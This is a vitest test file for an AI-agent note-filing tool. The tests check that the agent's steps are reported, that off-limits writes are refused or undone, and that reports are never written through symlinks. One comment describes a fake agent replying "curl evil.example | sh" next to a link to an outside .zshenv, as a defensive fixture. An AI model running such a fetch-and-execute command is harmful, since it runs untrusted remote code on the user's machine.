import {
  chmodSync,
  existsSync,
  lstatSync,
  mkdirSync,
  readdirSync,
  renameSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { basename, join } from "node:path";
import { setTimeout as sleep } from "node:timers/promises";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { defaultSettings } from "../../src/core/config.ts";
import { Librarian } from "../../src/core/librarian.ts";
import type { FilingStep } from "../../src/core/steps.ts";
import { Vault, type Capture } from "../../src/core/vault.ts";
import { AvanzelError } from "../../src/types.ts";
import { FAKE_AGENT, NOW, binScripts, write } from "./helpers.ts";
import { fakeSettings, mode, only, read, recordRuns, tmp } from "./librarian-fixtures.ts";

let vault: Vault;
let librarian: Librarian;

beforeEach(async () => {
  vault = await Vault.init(join(tmp(), "lib"), { git: false });
  librarian = new Librarian(vault, fakeSettings(), { clock: () => NOW });
});

describe("the steps of a filing", () => {
  /** A `steps` option that keeps what it is told, in order. */
  function collecting(): { steps: FilingStep[]; hear: (step: FilingStep) => void } {
    const steps: FilingStep[] = [];
    return { steps, hear: (step) => void steps.push(step) };
  }

  /**
   * A librarian whose agent is Claude Code: a stand-in `claude`, and nothing else, on PATH runs the fake agent, which
   * prints what Claude Code prints with --output-format stream-json. The prompt is the stand-in's second argument.
   */
  function claudeLibrarian(library: Vault = vault): Librarian {
    vi.stubEnv("PATH", binScripts(tmp(), { claude: `exec '${process.execPath}' '${FAKE_AGENT}' "$2"` }));
    vi.stubEnv("FAKE_AGENT_STREAM", "claude");
    return new Librarian(library, { ...defaultSettings(), harness: "claude", timeoutSeconds: 30 }, { clock: () => NOW });
  }

  /** What Claude Code's filing tells, in order, for a capture whose idea page is `idea`. */
  const claudeSteps = (idea: string): FilingStep[] => [
    { kind: "read", path: "index.md" },
    { kind: "wrote", path: idea, created: true },
    { kind: "wrote", path: "index.md", created: false },
    { kind: "wrote", path: "log.md", created: false },
  ];

  it("a filing tells each file the agent writes while it runs", async () => {
    vi.stubEnv("FAKE_AGENT_STEP_MS", "150"); // the fake harness reports nothing itself: its writes are seen in the folder
    const capture = librarian.captureText("Build a tiny greenhouse");
    const { steps, hear } = collecting();
    const outcome = await only(librarian.file(null, { steps: hear }));
    expect(steps).toContainEqual({ kind: "wrote", path: `ideas/idea-${capture.id}.md`, created: true });
    expect(steps).toContainEqual({ kind: "wrote", path: "index.md", created: false });
    expect(steps).toContainEqual({ kind: "wrote", path: "log.md", created: false });
    expect(steps).toHaveLength(3); // each one once
    expect(outcome.ok).toBe(true);
    expect(outcome.changes.pages).toEqual([`ideas/idea-${capture.id}.md`]);
  });

  it("tells a step while the agent is still working, not when it is over", async () => {
    // The agent writes a page, then waits (10 s at most) for the proof that its step was told, and notes whether it came.
    const told = join(tmp(), "told");
    const noted = join(tmp(), "noted");
    const agent = join(
      binScripts(tmp(), {
        agent: [
          "printf '# Seen\\n' > ideas/seen.md",
          "waited=0",
          `while [ ! -e '${told}' ] && [ "$waited" -lt 200 ]; do /bin/sleep 0.05; waited=$((waited + 1)); done`,
          `if [ -e '${told}' ]; then echo told > '${noted}'; else echo late > '${noted}'; fi`,
        ].join("\n"),
      }),
      "agent",
    );
    const harnesses = { fake: { name: "fake", headless: [agent, "{prompt}"], interactive: [] } };
    librarian = new Librarian(vault, fakeSettings({ harnesses }), { clock: () => NOW });
    librarian.captureText("a thought");
    const outcome = await only(librarian.file(null, { steps: () => writeFileSync(told, "") }));
    expect(read(noted)).toBe("told\n");
    expect(outcome.ok).toBe(true);
  });

  it("tells what the agent did, not what the guard then put back", async () => {
    mode("plant-task"); // the agent adds a task and changes another, and exits at once; the guard undoes both
    librarian.captureText("harmless words");
    const { steps, hear } = collecting();
    const outcome = await only(librarian.file(null, { steps: hear }));
    expect(outcome.guarded).toEqual(["tasks/evening-review.md", "tasks/planted.md"]);
    expect(existsSync(join(vault.root, "tasks", "planted.md"))).toBe(false);
    // The watch ends with the snapshot taken right after the run, before the guard runs. Were that taken after, the
    // library would no longer show the planted task. (librarian-snapshots.test.ts pins the order of the two.)
    expect(steps).toContainEqual({ kind: "wrote", path: "tasks/planted.md", created: true });
  });

  it("stops watching when the agent cannot be started", async () => {
    // Node lists a watch that is open among its active resources, so one left open can be seen without a mock.
    const open = () => process.getActiveResourcesInfo().filter((resource) => resource === "FSEventWrap").length;
    await vi.waitFor(() => expect(open()).toBe(0), { timeout: 3000 }); // earlier filings' watches finish closing
    // Executable, so it is picked, but its interpreter is not: running it is refused (EACCES). A missing agent (ENOENT)
    // is a NoAgentError, and `file` rejects with it.
    const interpreter = write(tmp(), "bin/interpreter", "not a program\n");
    const agent = write(tmp(), "bin/agent", `#!${interpreter}\n`);
    chmodSync(agent, 0o755);
    const harnesses = { fake: { name: "fake", headless: [agent, "{prompt}"], interactive: [] } };
    librarian = new Librarian(vault, fakeSettings({ harnesses }), { clock: () => NOW });
    librarian.captureText("a thought");
    const outcome = await only(librarian.file(null, { steps: () => {} }));
    expect(outcome.error).toContain(`Could not start \`${agent}\``);
    await vi.waitFor(() => expect(open()).toBe(0), { timeout: 3000 });
  });

  it("a Claude Code filing tells what it reads and writes from its own events", async () => {
    librarian = claudeLibrarian();
    const capture = librarian.captureText("Build a tiny greenhouse");
    const { steps, hear } = collecting();
    const outcome = await only(librarian.file(null, { steps: hear }));
    expect(steps).toEqual(claudeSteps(`ideas/idea-${capture.id}.md`));
    expect(outcome.message).toBe(`Filed into [[idea-${capture.id}]].`);
    expect(outcome.ok).toBe(true);
  });

  it("steps never name the capture or raw/", async () => {
    librarian = claudeLibrarian();
    vi.stubEnv("FAKE_AGENT_REFUSE", "raw/2026/10/x.md");
    librarian.captureText("Build a tiny greenhouse");
    const { steps, hear } = collecting();
    await only(librarian.file(null, { steps: hear }));
    const paths = steps.flatMap((step) => ("path" in step ? [step.path] : []));
    expect(paths.length).toBeGreaterThan(0); // the agent read the capture and tried raw/, so there is something to leave out
    expect(paths.filter((path) => /^(inbox|raw)\//.test(path))).toEqual([]);
  });

  it("the outcome lists what Claude Code was refused", async () => {
    librarian = claudeLibrarian();
    vi.stubEnv("FAKE_AGENT_REFUSE", "raw/2026/10/x.md");
    librarian.captureText("Build a tiny greenhouse");
    const outcome = await only(librarian.file()); // refusals are told whether or not steps are asked for
    expect(outcome.refused).toEqual(["raw/2026/10/x.md"]);
    expect(outcome.ok).toBe(true);
    expect(existsSync(join(vault.root, "raw", "2026", "10", "x.md"))).toBe(false);
  });

  it("a filing that failed still says what Claude Code was refused", async () => {
    mode("noop"); // the agent tries a write it may not make, and gives up in words
    librarian = claudeLibrarian();
    vi.stubEnv("FAKE_AGENT_REFUSE", "raw/2026/10/x.md");
    const capture = librarian.captureText("Build a tiny greenhouse");
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(false);
    expect(outcome.error).toContain("I would need permission to write files.");
    expect(outcome.refused).toEqual(["raw/2026/10/x.md"]);
    expect(vault.pending()).toEqual([capture.path]);
  });

  it("lists a refusal outside the library as the agent gave it", async () => {
    librarian = claudeLibrarian();
    vi.stubEnv("FAKE_AGENT_REFUSE", "../outside.md");
    librarian.captureText("Build a tiny greenhouse");
    const outcome = await only(librarian.file());
    expect(outcome.refused).toEqual([join(tmp(), "outside.md")]);
  });

  it("names paths relative to the library when it is reached through a symlink", async () => {
    // The agent works in the real folder and names real paths; the library is known by the link to it.
    const link = join(tmp(), "link");
    symlinkSync(vault.root, link);
    librarian = claudeLibrarian(new Vault(link));
    vi.stubEnv("FAKE_AGENT_REFUSE", "raw/2026/10/x.md");
    const capture = librarian.captureText("Build a tiny greenhouse");
    const { steps, hear } = collecting();
    const outcome = await only(librarian.file(null, { steps: hear }));
    expect(steps).toEqual(claudeSteps(`ideas/idea-${capture.id}.md`));
    expect(outcome.refused).toEqual(["raw/2026/10/x.md"]);
  });

  it("the evening review tells its filings' steps too, and not the digest it writes", async () => {
    const capture = librarian.captureText("Build a tiny greenhouse");
    const { steps, hear } = collecting();
    const review = await librarian.eveningReview({ steps: hear });
    expect(review.outcomes.map((outcome) => outcome.ok)).toEqual([true]);
    expect(review.digestPath).not.toBeNull();
    expect(steps).toContainEqual({ kind: "wrote", path: `ideas/idea-${capture.id}.md`, created: true });
    expect(steps.filter((step) => "path" in step && step.path.startsWith("reviews/"))).toEqual([]);
  });
});

describe("ask", () => {
  it("answers read-only", async () => {
    write(vault.root, "goals/run.md", "# Run");
    const outcome = await librarian.ask("What are my goals?");
    expect(outcome.result.ok).toBe(true);
    expect(outcome.result.output).toBe("Q: What are my goals?\nPages: goals/run.md");
    expect(outcome.changes.empty).toBe(true);
  });

  it("a read-only ask waits for the library lock", async () => {
    const runs = recordRuns();
    const waiting = "Waiting for another Avanzel run on this library…";
    const looking = "Looking through your library…";
    const heard: Array<[message: string, agentRunsStarted: number]> = []; // each message, with the agent runs started by then
    const progress = (message: string) => {
      heard.push([message, runs().length]);
    };
    let release = () => {};
    const held = vault.withLock(() => new Promise<void>((resolve) => (release = resolve))); // a filing, say, has the library
    const asking = librarian.ask("q", { progress });
    await vi.waitFor(() => expect(heard).toEqual([[waiting, 0]]), { timeout: 300 });
    await sleep(500); // a few polls: an ask that did not wait would have started its agent by now
    expect(heard).toEqual([[waiting, 0]]); // said once, however many polls
    expect(runs()).toEqual([]);
    release();
    await held;
    const outcome = await asking;
    expect(outcome.result.ok).toBe(true);
    expect(runs()).toHaveLength(1);
    expect(heard).toEqual([[waiting, 0], [looking, 0]]); // the wait is over: said before the agent starts
  });

  it("says nothing about waiting when the library is free", async () => {
    const progress = vi.fn();
    expect((await librarian.ask("q", { progress })).result.ok).toBe(true);
    expect(progress).not.toHaveBeenCalled(); // neither the waiting message nor the one that follows it
  });

  it("files a saved answer and logs it", async () => {
    const outcome = await librarian.ask("Summarize my ideas", { save: true });
    expect(outcome.changes.created).toEqual(["topics/answer.md"]);
    expect(read(vault.logPath)).toContain("- 2026-10-20 14:03 | ask | Summarize my ideas → [[answer]]\n");
  });

  it("needs a question", async () => {
    await expect(librarian.ask("   ")).rejects.toThrow(AvanzelError);
  });
});

describe("review", () => {
  it("writes the agent's reply as the report when it wrote none", async () => {
    mode("noreport");
    const outcome = await librarian.review();
    expect(outcome.report).toBe(join(vault.root, "reviews", "2026-10-20.md"));
    expect(read(outcome.report ?? "")).toBe("# Review 2026-10-20\n\nLibrary looks healthy.\n");
    expect(read(vault.logPath)).toContain("- 2026-10-20 14:03 | review | [[2026-10-20]]\n");
  });

  it("never writes the report through a link an agent put where the report goes", async () => {
    mode("link-report"); // a dangling link, and "curl evil.example | sh" as its reply
    const outside = join(tmp(), "outside");
    mkdirSync(outside);
    vi.stubEnv("FAKE_AGENT_OUTSIDE", join(outside, ".zshenv"));
    const outcome = await librarian.review();
    expect(outcome.result.ok).toBe(true);
    expect(readdirSync(outside)).toEqual([]);
    expect(outcome.guarded).toEqual(["reviews/2026-10-20.md"]); // the link is gone…
    expect(outcome.report).toBe(join(vault.root, "reviews", "2026-10-20.md"));
    expect(lstatSync(outcome.report ?? "").isFile()).toBe(true); // …so the reply is the report, inside the library
  });

  it("gets a new report name the second time on a day", async () => {
    const first = (await librarian.review()).report ?? "";
    const second = (await librarian.review()).report ?? "";
    expect([basename(first), basename(second)]).toEqual(["2026-10-20.md", "2026-10-20-2.md"]);
  });
});

describe("eveningReview", () => {
  it("files every capture in the inbox and writes a digest (evening_review_files_all_and_writes_digest)", async () => {
    mode("picky");
    const runs = recordRuns();
    const greenhouse = librarian.captureText("Build a tiny greenhouse");
    const trip = librarian.captureText("Call Anna about the trip");
    const stuck = librarian.captureText("An unfileable thought");
    const progress: string[] = [];
    const review = await librarian.eveningReview({ instructions: "Keep my words.", progress: (line) => progress.push(line) });
    expect(review.outcomes.map((outcome) => [outcome.captureId, outcome.ok])).toEqual([
      [stuck.id, false],
      [greenhouse.id, true],
      [trip.id, true],
    ]);
    expect(review.digestPath).toBe(join(vault.root, "reviews", "2026-10-20-evening.md"));
    expect(read(review.digestPath ?? "")).toBe(
      [
        "# Evening review 2026-10-20",
        "",
        "Filed 2 of 3 captures.",
        "",
        "## What went where",
        "",
        `- [[${greenhouse.id}]]: Filed into [[idea-${greenhouse.id}]].`,
        `  - New: [[idea-${greenhouse.id}]]`,
        `- [[${trip.id}]]: Filed into [[idea-${trip.id}]].`,
        `  - New: [[idea-${trip.id}]]`,
        "",
        "## Needs attention",
        "",
        `- [[${stuck.id}]]: agent crashed: cannot file this one (still in the inbox)`,
        "",
      ].join("\n"),
    );
    expect(read(vault.logPath)).toContain("- 2026-10-20 14:03 | review | [[2026-10-20-evening]]\n");
    expect(vault.pending()).toEqual([stuck.path]);
    expect(review.commits).toEqual([]); // this library is not versioned
    expect(runs().map((run) => run.prompt)).toHaveLength(3);
    for (const run of runs()) expect(run.prompt).toContain("The owner's standing instructions for this run: Keep my words.");
    expect(progress).toContain(`Filing ${greenhouse.id}.md with fake…`);
  });

  it("notes what the agent tried to change that it may not", async () => {
    mode("tamper");
    const capture = librarian.captureText("Original words");
    const review = await librarian.eveningReview();
    expect(read(review.digestPath ?? "")).toContain(
      `- [[${capture.id}]]: Filed into [[idea-${capture.id}]].\n  - New: [[idea-${capture.id}]]\n` +
        "  - The agent edited your capture; your original words were restored.\n",
    );
  });

  it("notes the links it removed from Avanzel's own folders", async () => {
    mode("link-audio");
    const outside = join(tmp(), "outside");
    mkdirSync(outside);
    vi.stubEnv("FAKE_AGENT_OUTSIDE", outside);
    librarian.captureText("harmless words");
    const review = await librarian.eveningReview();
    expect(read(review.digestPath ?? "")).toContain(
      "  - Undid the agent's changes to raw/audio/2026 " +
        "(library rules, settings and tasks are off-limits to it, and so are links in Avanzel's own folders).\n",
    );
  });

  describe("with a symlinked inbox/, an agent that changes the capture", () => {
    let capture: Capture;
    let kept: string;

    beforeEach(() => {
      mode("tamper"); // files it, then rewrites the capture
      const elsewhere = join(tmp(), "elsewhere");
      renameSync(vault.inbox, elsewhere);
      symlinkSync(elsewhere, vault.inbox);
      capture = librarian.captureText("My exact words");
      kept = `.avanzel/logs/${capture.id}.original.md`;
    });

    it("leaves the owner's words in .avanzel/logs, and the digest says so", async () => {
      const original = read(capture.path);
      const review = await librarian.eveningReview();
      const [outcome] = review.outcomes;
      expect(outcome).toMatchObject({ ok: false, savedOriginal: kept });
      expect(read(join(vault.root, kept))).toBe(original);
      const digest = read(review.digestPath ?? "");
      expect(digest).toContain(`(your words are kept in ${kept})`);
      expect(digest).not.toContain("still in the inbox");
    });

    it("never replaces words an earlier try kept", async () => {
      write(vault.root, kept, "the words of the first try\n");
      const outcome = await only(librarian.file());
      expect(outcome.savedOriginal).toBe(kept);
      expect(read(join(vault.root, kept))).toBe("the words of the first try\n");
    });
  });

  it("fails only the capture an unexpected error stops, files the rest, and writes the digest", async () => {
    const locked = librarian.captureText("Locked away");
    const basil = librarian.captureText("Water the basil");
    chmodSync(locked.path, 0o000); // reading it fails with EACCES, which is no AvanzelError
    const review = await librarian.eveningReview();
    expect(review.outcomes.map((outcome) => [outcome.captureId, outcome.ok])).toEqual([
      [locked.id, false],
      [basil.id, true],
    ]);
    expect(review.outcomes[0]?.error).toMatch(new RegExp(`^${locked.id}\\.md: EACCES: permission denied`));
    const digest = read(review.digestPath ?? "");
    expect(digest).toContain("Filed 1 of 2 captures.");
    expect(digest).toMatch(new RegExp(`- \\[\\[${locked.id}\\]\\]: ${locked.id}\\.md: EACCES: permission denied.* \\(still in the inbox\\)\\n`));
    expect(read(vault.logPath)).toContain("- 2026-10-20 14:03 | review | [[2026-10-20-evening]]\n");
    expect(vault.pending()).toEqual([locked.path]);
  });

  it("writes nothing when the inbox is empty", async () => {
    expect(await librarian.eveningReview()).toEqual({ outcomes: [], digestPath: null, commits: [] });
    expect(readdirSync(join(vault.root, "reviews"))).toEqual([]);
  });

  it("leaves captures the owner is editing in the inbox", async () => {
    const a = librarian.captureText("first");
    const b = librarian.captureText("second");
    const review = await librarian.eveningReview({ leave: (path) => path === a.path });
    expect(review.outcomes.map((outcome) => outcome.captureId)).toEqual([b.id]);
    expect(vault.pending()).toEqual([a.path]);
    expect(read(review.digestPath ?? "")).not.toContain(a.id); // left alone, not reported
  });

  it("never writes the digest through a link left where it would go", async () => {
    const outside = join(tmp(), "outside");
    mkdirSync(outside);
    symlinkSync(join(outside, ".zshenv"), join(vault.root, "reviews", "2026-10-20-evening.md"));
    librarian.captureText("one");
    const review = await librarian.eveningReview();
    expect(readdirSync(outside)).toEqual([]);
    expect(basename(review.digestPath ?? "")).toBe("2026-10-20-evening-2.md");
  });

  it("numbers a second digest on the same day", async () => {
    librarian.captureText("one");
    await librarian.eveningReview();
    librarian.captureText("two");
    const second = await librarian.eveningReview();
    expect(basename(second.digestPath ?? "")).toBe("2026-10-20-evening-2.md");
    expect(read(second.digestPath ?? "")).toContain("Filed 1 of 1 capture.\n");
  });
});
